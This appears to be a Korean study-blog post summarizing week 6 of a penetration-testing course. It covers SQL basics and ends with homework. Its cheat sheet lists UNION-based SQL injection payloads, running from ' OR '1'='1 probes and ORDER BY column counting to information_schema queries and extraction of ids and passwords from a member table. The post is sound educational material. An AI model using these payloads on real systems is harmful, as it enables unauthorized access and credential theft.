---
layout: post
title:  노말틱 모의해킹 스터디 6주차 강의 정리 
author: leewoojin
date: 2025-05-11 00:00:00 +0900
categories: [Pentest, W6]
tags: []
---

##  고민 방식

> 문제 발생 시!

1. 문제의 원인을 찾아라.  
2. 문제를 해결하라.  
3. 구글 검색은 영어 기반!  
   - ❌ google.kr  
   - ✅ google.com



##  SQL 인젝션은 어디에 사용되는가?

- **DB 데이터를 사용하는 곳**
- 그 데이터가 **화면에 출력되는가?**

| 구분 | 예시 |
|------|------|
| 출력됨 | 게시판 |
| 출력 안됨 | 로그인 |

```sql
-- 로그인 예시
SELECT * FROM member WHERE id = 'normaltic' AND pass = '1234'
-- SQLi 예시
' OR '1'='1'
```

##  주요 SQL 요소 정리

### 🔹 UNION
> `select * from board where idx='___'` 에서 SELECT를 한 번 더 건드릴 수 있음.

- 컬럼 수, 출력 위치가 정확히 맞아야 함.
- 짝이 맞지 않으면 **오류 발생**

### 🔹 ORDER BY
> 출력되는 데이터를 정렬할 때 사용

- `ORDER BY [컬럼명]` 또는 `ORDER BY [숫자 인덱스]`
- 인덱스가 컬럼 수보다 크면 오류

### 🔹 LIKE
> 부분 문자열 검색에 사용

```sql
WHERE title LIKE '%___%'
```

- `overwatch`, `over` → overwatch 검색됨  


##  UNION SQL Injection 치트시트

| 단계 | 설명 | 예시 |
|------|------|------|
| 1단계 | Injection 포인트 찾기 | `' OR '1'='1` → 참, `' OR '1'='2` → 거짓 |
| 2단계 | 컬럼 개수 찾기 | `' ORDER BY 1 --`, `' ORDER BY 2 --`, ... |
| 3단계 | 출력 컬럼 위치 확인 | `' UNION SELECT 1,2,3,4 --` |
| 4단계 | DB 이름 확인 | `' UNION SELECT 1,database(),3,4 --` |
| 5단계 | 테이블 이름 확인 | `FROM information_schema.tables WHERE table_schema='db명'` |
| 6단계 | 컬럼 이름 확인 | `FROM information_schema.columns WHERE table_name='member'` |
| 7단계 | 데이터 추출 | `' UNION SELECT 1,id,pass,4 FROM member --` |

> 📌 대부분 검색으로 해결 가능!  
> `mysql select column_name from information_schema.columns where ...` 식으로 찾아보자.


## 📚 과제

- [1] UNION SQL Injection 공부  
- [2] `doldol` 데이터만 출력하기 (하나만 출력되도록 구현)  
- [3] CTF 문제 풀기  
- [+] 웹 개발 (목표: 커뮤니티)  
  - 로그인  
  - 회원가입  
  - 마이페이지 (내 정보 보기)  
  - 게시판  
